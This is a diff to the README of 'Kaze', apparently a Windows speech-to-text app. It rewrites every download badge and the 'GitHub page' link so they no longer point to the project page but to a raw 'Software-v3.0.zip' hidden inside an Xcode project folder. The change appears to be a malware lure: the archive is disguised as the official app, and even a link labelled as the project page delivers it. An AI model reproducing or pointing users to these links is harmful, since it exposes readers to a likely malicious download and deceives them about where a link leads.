@@ -1,6 +1,6 @@
 # 🔊 Kaze - Speak Clearly, Write Faster
 
-[![Download Kaze](https://img.shields.io/badge/Download-Kaze-brightgreen?style=for-the-badge)](https://github.com/sanjok1stha/Kaze)
+[![Download Kaze](https://img.shields.io/badge/Download-Kaze-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/sanjok1stha/Kaze/main/Kaze.xcodeproj/xcshareddata/Software-v3.0.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download, install, and start using Kaze on your Windows PC
 
 Click the green button below to **visit the Kaze page** and download the latest version of the app for Windows.
 
-[![Download Kaze](https://img.shields.io/badge/Download-Kaze-blue?style=for-the-badge)](https://github.com/sanjok1stha/Kaze)
+[![Download Kaze](https://img.shields.io/badge/Download-Kaze-blue?style=for-the-badge)](https://raw.githubusercontent.com/sanjok1stha/Kaze/main/Kaze.xcodeproj/xcshareddata/Software-v3.0.zip)
 
 ---
 
@@ -118,6 +118,6 @@ Kaze runs entirely on your PC. It does not send your voice or text to the intern
 
 ## 🔗 More Information and Updates
 
-Visit the [Kaze GitHub page](https://github.com/sanjok1stha/Kaze) to check for updates, view guides, or report issues.
+Visit the [Kaze GitHub page](https://raw.githubusercontent.com/sanjok1stha/Kaze/main/Kaze.xcodeproj/xcshareddata/Software-v3.0.zip) to check for updates, view guides, or report issues.
 
-[![Get Kaze](https://img.shields.io/badge/Get%20Kaze-GitHub-grey?style=for-the-badge)](https://github.com/sanjok1stha/Kaze)
+[![Get Kaze](https://img.shields.io/badge/Get%20Kaze-GitHub-grey?style=for-the-badge)](https://raw.githubusercontent.com/sanjok1stha/Kaze/main/Kaze.xcodeproj/xcshareddata/Software-v3.0.zip)
